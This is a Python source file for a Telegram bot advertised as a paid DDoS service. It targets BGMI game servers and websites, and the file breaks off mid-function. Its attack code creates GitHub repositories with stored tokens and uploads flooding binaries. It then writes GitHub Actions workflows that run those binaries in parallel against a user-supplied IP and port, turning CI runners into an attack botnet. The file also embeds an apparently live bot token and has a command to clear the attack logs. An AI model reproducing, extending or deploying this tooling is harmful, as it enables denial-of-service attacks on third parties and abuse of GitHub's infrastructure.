import os
import json
import asyncio
import time
import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from github import Github, GithubException

# 𝙄𝙣𝙨𝙚𝙧𝙩 𝙮𝙤𝙪𝙧 𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝙗𝙤𝙩 𝙩𝙤𝙠𝙚𝙣 𝙝𝙚𝙧𝙚
BOT_TOKEN = "8384718077:AAGtx4EfKuQ6e2I80_l5J3UJ6Fi_D56y8dM"
OWNER_USER_ID = 7723674846

# 𝘼𝙙𝙢𝙞𝙣 𝙪𝙨𝙚𝙧 𝙄𝘿𝙨
admin_id = ["7723674846"]

# 𝙎𝙩𝙤𝙧𝙖𝙜𝙚 𝙛𝙞𝙡𝙚𝙨
TOKENS_FILE = "tokens.json"
USERS_FILE = "users.json"
ATTACK_JOBS_FILE = "attack_jobs.json"
LOG_FILE = "log.txt"

def get_inline_keyboard():
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔰 𝘾𝙊𝙉𝙏𝘼𝘾𝙏 𝙊𝙒𝙉𝙀𝙍 🔰", url="https://t.me/Its_MeVishall")],
        [InlineKeyboardButton("⚕️ 𝙅𝙊𝙄𝙉 𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 ⚕️", url="https://t.me/ItsMeVishalBots")]
    ])
    return keyboard

# 𝙄𝙣𝙞𝙩𝙞𝙖𝙡𝙞𝙯𝙚 𝙨𝙩𝙤𝙧𝙖𝙜𝙚
def init_storage():
    if not os.path.exists(TOKENS_FILE):
        with open(TOKENS_FILE, 'w') as f:
            json.dump({"tokens": []}, f)
    
    if not os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'w') as f:
            json.dump({"users": [OWNER_USER_ID]}, f)
    
    if not os.path.exists(ATTACK_JOBS_FILE):
        with open(ATTACK_JOBS_FILE, 'w') as f:
            json.dump({"jobs": {}}, f)

# 𝙇𝙤𝙖𝙙 𝙩𝙤𝙠𝙚𝙣𝙨
def load_tokens():
    with open(TOKENS_FILE, 'r') as f:
        return json.load(f)["tokens"]

# 𝙎𝙖𝙫𝙚 𝙩𝙤𝙠𝙚𝙣𝙨
def save_tokens(tokens):
    with open(TOKENS_FILE, 'w') as f:
        json.dump({"tokens": tokens}, f)

# 𝙇𝙤𝙖𝙙 𝙪𝙨𝙚𝙧𝙨
def load_users():
    with open(USERS_FILE, 'r') as f:
        return json.load(f)["users"]

# 𝙎𝙖𝙫𝙚 𝙪𝙨𝙚𝙧𝙨
def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump({"users": users}, f)

# 𝙇𝙤𝙖𝙙 𝙟𝙤𝙗𝙨
def load_jobs():
    with open(ATTACK_JOBS_FILE, 'r') as f:
        return json.load(f)["jobs"]

# 𝙎𝙖𝙫𝙚 𝙟𝙤𝙗𝙨
def save_jobs(jobs):
    with open(ATTACK_JOBS_FILE, 'w') as f:
        json.dump({"jobs": jobs}, f)

# 𝘾𝙝𝙚𝙘𝙠 𝙞𝙛 𝙪𝙨𝙚𝙧 𝙞𝙨 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙
def is_authorized(user_id):
    users = load_users()
    return user_id in users

# 𝘾𝙝𝙚𝙘𝙠 𝙞𝙛 𝙪𝙨𝙚𝙧 𝙞𝙨 𝙖𝙙𝙢𝙞𝙣
def is_admin(user_id):
    return str(user_id) in admin_id

# 𝘾𝙝𝙚𝙘𝙠 𝙞𝙛 𝙪𝙨𝙚𝙧 𝙞𝙨 𝙤𝙬𝙣𝙚𝙧
def is_owner(user_id):
    return user_id == OWNER_USER_ID

# 𝙁𝙪𝙣𝙘𝙩𝙞𝙤𝙣 𝙩𝙤 𝙡𝙤𝙜 𝙘𝙤𝙢𝙢𝙖𝙣𝙙
def log_command(user_id, target, port, time):
    with open(LOG_FILE, "a") as file:
        file.write(f"UserID: {user_id}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# 𝙁𝙪𝙣𝙘𝙩𝙞𝙤𝙣 𝙩𝙤 𝙘𝙡𝙚𝙖𝙧 𝙡𝙤𝙜𝙨
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                return "𝙇𝙤𝙜𝙨 𝙖𝙧𝙚 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙘𝙡𝙚𝙖𝙧𝙚𝙙. 𝙉𝙤 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙙."
            else:
                file.truncate(0)
                return "𝙇𝙤𝙜𝙨 𝙘𝙡𝙚𝙖𝙧𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮"
    except FileNotFoundError:
        return "𝙉𝙤 𝙡𝙤𝙜𝙨 𝙛𝙤𝙪𝙣𝙙 𝙩𝙤 𝙘𝙡𝙚𝙖𝙧."

def create_vishal_repos(token):
    """𝘾𝙧𝙚𝙖𝙩𝙚 𝙧𝙚𝙥𝙤𝙨𝙞𝙩𝙤𝙧𝙞𝙚𝙨 𝙛𝙤𝙧 𝙥𝙖𝙧𝙖𝙡𝙡𝙚𝙡 𝙚𝙭𝙚𝙘𝙪𝙩𝙞𝙤𝙣"""
    try:
        g = Github(token)
        user = g.get_user()
        repos = []
        
        repo_names = ["vishal1", "vishal2", "vishal3", "vishal4"]
        
        for repo_name in repo_names:
            try:
                repo = user.get_repo(repo_name)
                repos.append(repo)
            except GithubException:
                repo = user.create_repo(repo_name, private=False, auto_init=True)
                repos.append(repo)
                
        return repos
    except Exception as e:
        print(f"Error creating repos: {e}")
        return None

def update_workflow_and_trigger(token, ip, port, attack_time):
    """𝙐𝙥𝙙𝙖𝙩𝙚 𝙬𝙤𝙧𝙠𝙛𝙡𝙤𝙬 𝙞𝙣 𝙖𝙡𝙡 4 𝙧𝙚𝙥𝙤𝙨 𝙬𝙞𝙩𝙝 5 𝙥𝙖𝙧𝙖𝙡𝙡𝙚𝙡 𝙟𝙤𝙗𝙨 𝙚𝙖𝙘𝙝"""
    try:
        g = Github(token)
        user = g.get_user()
        
        repo_names = ["vishal1", "vishal2", "vishal3", "vishal4"]
        success_count = 0
        
        for i, repo_name in enumerate(repo_names):
            try:
                repo = user.get_repo(repo_name)
                
                if i == 0:
                    run_command = f"sudo ./vishalcracks {ip} {port} {attack_time} 999"
                    binary_name = "vishalcracks"
                else:
                    run_command = f"sudo ./vishal {ip} {port} {attack_time}"
                    binary_name = "vishal"
                
                yml_content = f"""name: VISHAL Attack
on: 
  workflow_dispatch:
  push:

jobs:
  attack1:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: chmod +x {binary_name}
      - run: {run_command}
  
  attack2:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: chmod +x {binary_name}
      - run: {run_command}
  
  attack3:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: chmod +x {binary_name}
      - run: {run_command}
  
  attack4:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: chmod +x {binary_name}
      - run: {run_command}
  
  attack5:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: chmod +x {binary_name}
      - run: {run_command}
"""
                
                commit_message = f"VISHAL Attack {ip}:{port} for {attack_time}s"
                workflow_path = ".github/workflows/attack.yml"
                
                try:
                    repo.get_contents(".github/workflows")
                except:
                    repo.create_file(".github/workflows/.gitkeep", "Create workflows", "")
                
                try:
                    contents = repo.get_contents(workflow_path)
                    repo.update_file(contents.path, commit_message, yml_content, contents.sha)
                except:
                    repo.create_file(workflow_path, commit_message, yml_content)
                
                workflows = repo.get_workflows()
                for workflow in workflows:
                    if workflow.name == "VISHAL Attack":
                        try:
                            workflow.create_dispatch(ref="main")
                            success_count += 5
                            print(f"✅ Triggered 5 workflows in {repo_name}")
                            break
                        except Exception as e:
                            print(f"Dispatch error in {repo_name}: {e}")
                            try:
                                try:
                                    contents = repo.get_contents("trigger.txt")
                                    repo.update_file(contents.path, "Trigger attack", str(time.time()), contents.sha)
                                except:
                                    repo.create_file("trigger.txt", "Trigger attack", str(time.time()))
                                success_count += 5
                                print(f"✅ Push-triggered 5 workflows in {repo_name}")
                            except Exception as e2:
                                print(f"Push trigger error in {repo_name}: {e2}")
                                continue
                
            except Exception as e:
                print(f"Error in {repo_name}: {e}")
                continue
        
        return success_count
        
    except Exception as e:
        print(f"Workflow error: {e}")
        return 0

def upload_binary_to_repos(token, binary_contents):
    """𝙐𝙥𝙡𝙤𝙖𝙙 4 𝙙𝙞𝙛𝙛𝙚𝙧𝙚𝙣𝙩 𝙗𝙞𝙣𝙖𝙧𝙞𝙚𝙨 𝙩𝙤 4 𝙙𝙞𝙛𝙛𝙚𝙧𝙚𝙣𝙩 𝙧𝙚𝙥𝙤𝙨𝙞𝙩𝙤𝙧𝙞𝙚𝙨"""
    try:
        g = Github(token)
        user = g.get_user()
        
        repo_names = ["vishal1", "vishal2", "vishal3", "vishal4"]
        success_count = 0
        
        for i, repo_name in enumerate(repo_names):
            try:
                if i >= len(binary_contents):
                    print(f"❌ Not enough binaries for {repo_name}")
                    continue
                    
                repo = user.get_repo(repo_name)
                binary_content = binary_contents[i]
                
                if i == 0:
                    filename = "vishalcracks"
                else:
                    filename = "vishal"
                
                try:
                    contents = repo.get_contents(filename)
                    repo.update_file(contents.path, f"Update {filename} binary", binary_content, contents.sha)
                except:
                    repo.create_file(filename, f"Add {filename} binary", binary_content)
                
                success_count += 1
                print(f"✅ Uploaded {filename} to {repo_name}")
                
            except Exception as e:
                print(f"Upload error to {repo_name}: {e}")
                continue
        
        return success_count
    except Exception as e:
        print(f"Upload error: {e}")
        return 0

def get_workflow_status(token):
    """𝙂𝙚𝙩 𝙬𝙤𝙧𝙠𝙛𝙡𝙤𝙬 𝙨𝙩𝙖𝙩𝙪𝙨 𝙛𝙧𝙤𝙢 𝙖𝙡𝙡 4 𝙧𝙚𝙥𝙤𝙨"""
    try:
        g = Github(token)
        user = g.get_user()
        
        repo_names = ["vishal1", "vishal2", "vishal3", "vishal4"]
        running_count = 0
        completed_count = 0
        
        for repo_name in repo_names:
            try:
                repo = user.get_repo(repo_name)
                workflows = repo.get_workflows()
                
                for workflow in workflows:
                    runs = workflow.get_runs()
                    for run in runs:
                        if run.status == "in_progress":
                            running_count += 1
                        elif run.status == "completed":
                            completed_count += 1
            except:
                continue
        
        return running_count, completed_count
    except Exception as e:
        print(f"Status error: {e}")
        return 0, 0

def get_all_workflows_status():
    tokens = load_tokens()
    total_running = 0
    total_completed = 0
    
    for token in tokens:
        try:
            running, completed = get_workflow_status(token)
            total_running += running
            total_completed += completed
        except:
            pass
    
    return total_running, total_completed

def cancel_all_workflows():
    """𝘾𝙖𝙣𝙘𝙚𝙡 𝙖𝙡𝙡 𝙧𝙪𝙣𝙣𝙞𝙣𝙜 𝙬𝙤𝙧𝙠𝙛𝙡𝙤𝙬𝙨 𝙛𝙧𝙤𝙢 𝙖𝙡𝙡 𝙧𝙚𝙥𝙤𝙨"""
    tokens = load_tokens()
    cancelled_count = 0
    
    for token in tokens:
        try:
            g = Github(token)
            user = g.get_user()
            
            repo_names = ["vishal1", "vishal2", "vishal3", "vishal4"]
            
            for repo_name in repo_names:
                try:
                    repo = user.get_repo(repo_name)
                    workflows = repo.get_workflows()
                    
                    for workflow in workflows:
                        runs = workflow.get_runs()
                        for run in runs:
                            if run.status == "in_progress":
                                try:
                                    run.cancel()
                                    cancelled_count += 1
                                    print(f"✅ Cancelled workflow in {repo_name}")
                                except:
                                    pass
                except:
                    continue
        except Exception as e:
            print(f"Cancel error: {e}")
    
    return cancelled_count

# 𝙎𝙩𝙤𝙧𝙚 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙗𝙞𝙣𝙖𝙧𝙞𝙚𝙨 𝙩𝙚𝙢𝙥𝙤𝙧𝙖𝙧𝙞𝙡𝙮
uploaded_binaries = []

# 𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝙗𝙤𝙩 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙨
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_name = update.effective_user.first_name
    response = f"""🍀 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝙑𝙄𝙎𝙃𝘼𝙇 𝘼𝙏𝙏𝘼𝘾𝙆 𝘽𝙊𝙏, {user_name}!

⚡ 𝙒𝙤𝙧𝙡𝙙'𝙨 𝙈𝙤𝙨𝙩 𝙋𝙤𝙬𝙚𝙧𝙛𝙪𝙡 𝘿𝘿𝙊𝙎 𝘽𝙤𝙩
👑 𝘾𝙧𝙚𝙖𝙩𝙚𝙙 𝘽𝙮: @Its_MeVishall

𝙏𝙧𝙮: /help 𝙛𝙤𝙧 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙨"""
    await update.message.reply_text(response, reply_markup=get_inline_keyboard())

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """🍀 𝘼𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙨:

⚡ /vishal : 𝙈𝙚𝙩𝙝𝙤𝙙 𝙁𝙤𝙧 𝘽𝙂𝙈𝙄 & 𝙒𝙚𝙗𝙨𝙞𝙩𝙚𝙨
📖 /rules : 𝙋𝙡𝙚𝙖𝙨𝙚 𝘾𝙝𝙚𝙘𝙠 𝘽𝙚𝙛𝙤𝙧𝙚 𝙐𝙨𝙚!
📊 /mylogs : 𝙏𝙤 𝘾𝙝𝙚𝙘𝙠 𝙔𝙤𝙪𝙧 𝙍𝙚𝙘𝙚𝙣𝙩𝙨 𝘼𝙩𝙩𝙖𝙘𝙠𝙨
💎 /plan : 𝘾𝙝𝙚𝙘𝙠𝙤𝙪𝙩 𝙊𝙪𝙧 𝘽𝙤𝙩𝙣𝙚𝙩 𝙍𝙖𝙩𝙚𝙨
📊 /status : 𝘾𝙝𝙚𝙘𝙠 𝘼𝙩𝙩𝙖𝙘𝙠 𝙎𝙩𝙖𝙩𝙪𝙨
🛑 /stop : 𝙎𝙩𝙤𝙥 𝘼𝙡𝙡 𝘼𝙩𝙩𝙖𝙘𝙠𝙨

👑 𝘼𝙙𝙢𝙞𝙣 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨:
/admincmd : 𝙎𝙝𝙤𝙬𝙨 𝘼𝙡𝙡 𝘼𝙙𝙢𝙞𝙣 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨

👤 𝘾𝙤𝙣𝙩𝙖𝙘𝙩: @Its_MeVishall"""
    await update.message.reply_text(help_text, reply_markup=get_inline_keyboard())

async def rules(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_name = update.effective_user.first_name
    response = f"""📖 {user_name} 𝙋𝙡𝙚𝙖𝙨𝙚 𝙁𝙤𝙡𝙡𝙤𝙬 𝙏𝙝𝙚𝙨𝙚 𝙍𝙪𝙡𝙚𝙨:

𝟭. 𝘿𝙤𝙣'𝙩 𝙍𝙪𝙣 𝙏𝙤𝙤 𝙈𝙖𝙣𝙮 𝘼𝙩𝙩𝙖𝙘𝙠𝙨 !! 𝘾𝙖𝙪𝙨𝙚 𝘼 𝘽𝙖𝙣 𝙁𝙧𝙤𝙢 𝘽𝙤𝙩
𝟮. 𝘿𝙤𝙣'𝙩 𝙍𝙪𝙣 𝟮 𝘼𝙩𝙩𝙖𝙘𝙠𝙨 𝘼𝙩 𝙎𝙖𝙢𝙚 𝙏𝙞𝙢𝙚
𝟯. 𝙒𝙚 𝘿𝙖𝙞𝙡𝙮 𝘾𝙝𝙚𝙘𝙠𝙨 𝙏𝙝𝙚 𝙇𝙤𝙜𝙨

👤 𝘾𝙤𝙣𝙩𝙖𝙘𝙩: @Its_MeVishall"""
    await update.message.reply_text(response)

async def plan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_name = update.effective_user.first_name
    response = f"""💎 {user_name}, 𝙋𝙇𝘼𝙉 𝘿𝙀𝙆𝙃𝙀𝙂𝘼 𝙏𝙐 

⚡ 𝙑𝙄𝙎𝙃𝘼𝙇 𝘼𝙏𝙏𝘼𝘾𝙆 𝘽𝙊𝙏 𝙋𝙇𝘼𝙉𝙎:

🔥 𝘽𝘼𝙎𝙄𝘾 𝙋𝘼𝘾𝙆
• 𝟭𝟬𝟬 𝘼𝙩𝙩𝙖𝙘𝙠𝙨/𝘿𝙖𝙮
• 𝟯𝟬 𝙎𝙚𝙘 𝘾𝙤𝙤𝙡𝙙𝙤𝙬𝙣
• 𝘽𝙂𝙈𝙄 & 𝙒𝙚𝙗𝙨𝙞𝙩𝙚 𝘼𝙩𝙩𝙖𝙘𝙠𝙨

💎 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙋𝘼𝘾𝙆  
• 𝙐𝙣𝙡𝙞𝙢𝙞𝙩𝙚𝙙 𝘼𝙩𝙩𝙖𝙘𝙠𝙨
• 𝟬 𝙎𝙚𝙘 𝘾𝙤𝙤𝙡𝙙𝙤𝙬𝙣
• 𝙋𝙧𝙞𝙤𝙧𝙞𝙩𝙮 𝙎𝙪𝙥𝙥𝙤𝙧𝙩

👑 𝙑𝙄𝙋 𝙋𝘼𝘾𝙆
• 𝙀𝙫𝙚𝙧𝙮𝙩𝙝𝙞𝙣𝙜 𝙞𝙣 𝙋𝙧𝙚𝙢𝙞𝙪𝙢
• 𝘾𝙪𝙨𝙩𝙤𝙢 𝙈𝙚𝙩𝙝𝙤𝙙𝙨
• 𝟮𝟰/𝟳 𝙎𝙪𝙥𝙥𝙤𝙧𝙩

👤 𝘾𝙤𝙣𝙩𝙖𝙘𝙩: @Its_MeVishall 𝙛𝙤𝙧 𝙗𝙪𝙮"""
    await update.message.reply_text(response, reply_markup=get_inline_keyboard())

async def admincmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_name = update.effective_user.first_name
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ 𝙊𝙉𝙇𝙔 𝘼𝘿𝙈𝙄𝙉 𝙍𝙐𝙉 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿")
        return
        
    response = f"""👑 {user_name}, 𝘼𝙙𝙢𝙞𝙣 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨:

/add <userid> : 𝘼𝙙𝙙 𝙖 𝙐𝙨𝙚𝙧
/remove <userid> : 𝙍𝙚𝙢𝙤𝙫𝙚 𝙖 𝙐𝙨𝙚𝙧
/allusers : 𝘼𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝙐𝙨𝙚𝙧𝙨 𝙇𝙞𝙨𝙩
/logs : 𝘼𝙡𝙡 𝙐𝙨𝙚𝙧𝙨 𝙇𝙤𝙜𝙨
/broadcast : 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩 𝙖 𝙈𝙚𝙨𝙨𝙖𝙜𝙚
/clearlogs : 𝘾𝙡𝙚𝙖𝙧 𝙏𝙝𝙚 𝙇𝙤𝙜𝙨 𝙁𝙞𝙡𝙚
/token : 𝘼𝙙𝙙 𝙂𝙞𝙩𝙃𝙪𝙗 𝙏𝙤𝙠𝙚𝙣
/tokens : 𝙎𝙝𝙤𝙬 𝘼𝙡𝙡 𝙏𝙤𝙠𝙚𝙣𝙨
/addbinary : 𝘼𝙙𝙙 𝘽𝙞𝙣𝙖𝙧𝙮 𝙁𝙞𝙡𝙚𝙨

👤 𝘽𝙮: @Its_MeVishall"""
    await update.message.reply_text(response)

# 𝙐𝙎𝙀𝙍 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎
async def vishal(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ 𝙊𝙉𝙇𝙔 𝙋𝘼𝙄𝘿 𝙈𝙀𝙈𝘽𝙀𝙍 𝙐𝙎𝙀 𝙏𝙃𝙄𝙎 𝘽𝙊𝙏\n\n👤 𝘿𝙈: @Its_MeVishall 𝙩𝙤 🗝️")
        return
    
    if len(context.args) != 3:
        await update.message.reply_text("⚠️ 𝙄𝙉𝙑𝘼𝙇𝙄𝘿 𝙁𝙊𝙍𝙈𝘼𝙏\n\n𝙀𝙭𝙖𝙢𝙥𝙡𝙚: /attack <ip> <port> <time>")
        return
    
    ip, port, attack_time = context.args
    
    try:
        attack_time = int(attack_time)
        port = int(port)
    except ValueError:
        await update.message.reply_text("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙥𝙤𝙧𝙩 𝙤𝙧 𝙩𝙞𝙢𝙚 𝙫𝙖𝙡𝙪𝙚.")
        return
    
    if attack_time > 300:
        await update.message.reply_text("❌ 𝙀𝙧𝙧𝙤𝙧: 𝙏𝙞𝙢𝙚 𝙞𝙣𝙩𝙚𝙧𝙫𝙖𝙡 𝙢𝙪𝙨𝙩 𝙗𝙚 𝙡𝙚𝙨𝙨 𝙩𝙝𝙖𝙣 300.")
        return
    
    tokens = load_tokens()
    if not tokens:
        await update.message.reply_text("❌ 𝙉𝙤 𝙂𝙞𝙩𝙃𝙪𝙗 𝙩𝙤𝙠𝙚𝙣𝙨 𝙖𝙙𝙙𝙚𝙙! 𝘼𝙙𝙢𝙞𝙣 𝙣𝙚𝙚𝙙𝙨 𝙩𝙤 𝙖𝙙𝙙 𝙩𝙤𝙠𝙚𝙣𝙨 𝙛𝙞𝙧𝙨𝙩.")
        return
    
    # 𝙇𝙤𝙜 𝙘𝙤𝙢𝙢𝙖𝙣𝙙
    log_command(user_id, ip, port, attack_time)
    
    # 𝙎𝙩𝙖𝙧𝙩 𝙖𝙩𝙩𝙖𝙘𝙠 𝙧𝙚𝙥𝙡𝙮
    user_name = update.effective_user.first_name
    await update.message.reply_text(
        f"🍀 𝘿𝘿𝙊𝙎 𝙐𝙎𝙀𝙍 {user_name} 💎\n\n"
        f"⚡ 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏𝙀𝘿 ⚡\n\n"
        f"🎯 𝙃𝙊𝙎𝙏: {ip}\n"
        f"👙 𝙋𝙊𝙍𝙏: {port}\n"
        f"⏳ 𝙏𝙄𝙈𝙀: {attack_time} 𝙎𝙀𝘾𝙊𝙉𝘿\n"
        f"👤 𝙎𝙀𝙉𝘿 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆: @Its_MeVishall"
    )
    
    # 𝙇𝙖𝙪𝙣𝙘𝙝 𝙖𝙩𝙩𝙖𝙘𝙠
    total_success = 0
    total_failed = 0
    job_id = str(int(time.time()))
    jobs = load_jobs()
    
    jobs[job_id] = {
        'ip': ip,
        'port': port,
        'time': attack_time,
        'start_time': time.time(),
        'tokens_used': [],
        'workflows_triggered': 0,
        'status': 'running'
    }
    
    for token in tokens:
        try:
            g = Github(token)
            user = g.get_user()
            
            success_count = update_workflow_and_trigger(token, ip, port, attack_time)
            if success_count > 0:
                total_success += success_count
                jobs[job_id]['tokens_used'].append(f"{user.login} ({success_count} workflows)")
                jobs[job_id]['workflows_triggered'] += success_count
            else:
                total_failed += 1
                
        except Exception as e:
            total_failed += 1
            print(f"Attack error: {e}")
    
    jobs[job_id]['success_count'] = total_success
    save_jobs(jobs)
    
    total_workflows = len(tokens) * 20
    
    await update.message.reply_text(
        f"✅ 𝘼𝙏𝙏𝘼𝘾𝙆 𝙇𝘼𝙐𝙉𝘾𝙃𝙀𝘿!\n\n"
        f"🎯 𝙏𝙖𝙧𝙜𝙚𝙩: {ip}:{port}\n"
        f"⏰ 𝙏𝙞𝙢𝙚: {attack_time}𝙨\n"
        f"🔥 𝙒𝙤𝙧𝙠𝙛𝙡𝙤𝙬𝙨 𝙏𝙧𝙞𝙜𝙜𝙚𝙧𝙚𝙙: {total_success}/{total_workflows}\n"
        f"❌ 𝙁𝙖𝙞𝙡𝙚𝙙 𝙏𝙤𝙠𝙚𝙣𝙨: {total_failed}\n"
        f"📊 𝙅𝙤𝙗 𝙄𝘿: {job_id}"
    )
    
    if total_success > 0:
        asyncio.create_task(monitor_job_completion(job_id, update.message.chat_id))

async def check_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update.effective_user.id):
        await update.message.reply_text("❌ 𝙔𝙊𝙐 𝘼𝙍𝙀 𝙉𝙊𝙏 𝘼𝙐𝙏𝙃𝙊𝙍𝙄𝙕𝙀𝘿 𝙏𝙊 𝙐𝙎𝙀 𝙏𝙃𝙄𝙎 𝘽𝙊𝙏")
        return
    
    running, completed = get_all_workflows_status()
    jobs = load_jobs()
    
    active_jobs = 0
    for job_id, job_info in jobs.items():
        if job_info.get('status') == 'running':
            active_jobs += 1
    
    total_tokens = len(load_tokens())
    total_workflows = total_tokens * 20
    
    status_message = f"📊 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙏𝙐𝙎:\n\n"
    status_message += f"🟢 𝙍𝙪𝙣𝙣𝙞𝙣𝙜 𝙒𝙤𝙧𝙠𝙛𝙡𝙤𝙬𝙨: {running}\n"
    status_message += f"✅ 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙 𝙒𝙤𝙧𝙠𝙛𝙡𝙤𝙬𝙨: {completed}\n"
    status_message += f"🔥 𝘼𝙘𝙩𝙞𝙫𝙚 𝙅𝙤𝙗𝙨: {active_jobs}\n"
    status_message += f"🔑 𝙏𝙤𝙩𝙖𝙡 𝙏𝙤𝙠𝙚𝙣𝙨: {total_tokens}\n"
    status_message += f"🏠 𝙏𝙤𝙩𝙖𝙡 𝙍𝙚𝙥𝙤𝙨𝙞𝙩𝙤𝙧𝙞𝙚𝙨: {total_tokens * 4}\n"
    status_message += f"⚡ 𝙏𝙤𝙩𝙖𝙡 𝙒𝙤𝙧𝙠𝙛𝙡𝙤𝙬𝙨 𝘾𝙖𝙥𝙖𝙘𝙞𝙩𝙮: {total_workflows}\n\n"
    
    if running == 0 and active_jobs > 0:
        status_message += "⚠️ 𝘼𝙡𝙡 𝙬𝙤𝙧𝙠𝙛𝙡𝙤𝙬𝙨 𝙘𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙! 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙨𝙩𝙖𝙧𝙩 𝙣𝙚𝙬 𝙖𝙩𝙩𝙖𝙘𝙠.\n"
    elif running > 0:
        status_message += "🎯 5-𝙬𝙤𝙧𝙠𝙛𝙡𝙤𝙬𝙨 𝙖𝙩𝙩𝙖𝙘𝙠𝙞𝙣𝙜 𝙥𝙚𝙧 𝙧𝙚𝙥𝙤𝙨𝙞𝙩𝙤𝙧𝙮...\n"
    else:
        status_message += "💤 𝙉𝙤 𝙖𝙘𝙩𝙞𝙫𝙚 𝙖𝙩𝙩𝙖𝙘𝙠𝙨\n"
    
    await update.message.reply_text(status_message)

async def stop_attacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update.effective_user.id):
        await update.message.reply_text("❌ 𝙔𝙊𝙐 𝘼𝙍𝙀 𝙉𝙊𝙏 𝘼𝙐𝙏𝙃𝙊𝙍𝙄𝙕𝙀𝘿 𝙏𝙊 𝙐𝙎𝙀 𝙏𝙃𝙄𝙎 𝘽𝙊𝙏")
        return
    
    await update.message.reply_text("🛑 𝙎𝙩𝙤𝙥𝙥𝙞𝙣𝙜 𝙖𝙡𝙡 𝙖𝙩𝙩𝙖𝙘𝙠𝙨...")
    
    cancelled_count = cancel_all_workflows()
    
    jobs = load_jobs()
    stopped_jobs = 0
    for job_id, job_info in jobs.items():
        if job_info.get('status') == 'running':
            jobs[job_id]['status'] = 'stopped'
            stopped_jobs += 1
    
    save_jobs(jobs)
    
    await update.message.reply_text(
        f"✅ 𝘼𝙇𝙇 𝘼𝙏𝙏𝘼𝘾𝙆𝙎 𝙎𝙏𝙊𝙋𝙋𝙀𝘿!\n\n"
        f"🛑 𝘾𝙖𝙣𝙘𝙚𝙡𝙡𝙚𝙙 𝙒𝙤𝙧𝙠𝙛𝙡𝙤𝙬𝙨: {cancelled_count}\n"
        f"📊 𝙎𝙩𝙤𝙥𝙥𝙚𝙙 𝙅𝙤𝙗𝙨: {stopped_jobs}\n\n"
        f"🚀 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙨𝙩𝙖𝙧𝙩 𝙣𝙚𝙬 𝙖𝙩𝙩𝙖𝙘𝙠 𝙣𝙤𝙬!"
    )

async def monitor_job_completion(job_id, chat_id):
    app = Application.builder().token(BOT_TOKEN).build()
    
    await asyncio.sleep(120)
    
    jobs = load_jobs()
    if job_id not in jobs:
        return
    
    if jobs[job_id].get('status') == 'stopped':
        return
    
    running, completed = get_all_workflows_status()
    
    if running == 0:
        job_info = jobs[job_id]
        await app.bot.send_message(
            chat_id=chat_id,
            text=f"✅ 𝘼𝙏𝙏𝘼𝘾𝙆𝙎 𝘾𝙊𝙈𝙋𝙇𝙀𝙏𝙀𝘿!\n\n"
                 f"🎯 𝙅𝙤𝙗 𝙄𝘿: {job_id}\n"
                 f"🎯 𝙏𝙖𝙧𝙜𝙚𝙩: {job_info['ip']}:{job_info['port']}\n"
                 f"⏰ 𝙏𝙞𝙢𝙚: {job_info['time']}𝙨\n"
                 f"✅ 𝙒𝙤𝙧𝙠𝙛𝙡𝙤𝙬𝙨: {job_info['workflows_triggered']}\n\n"
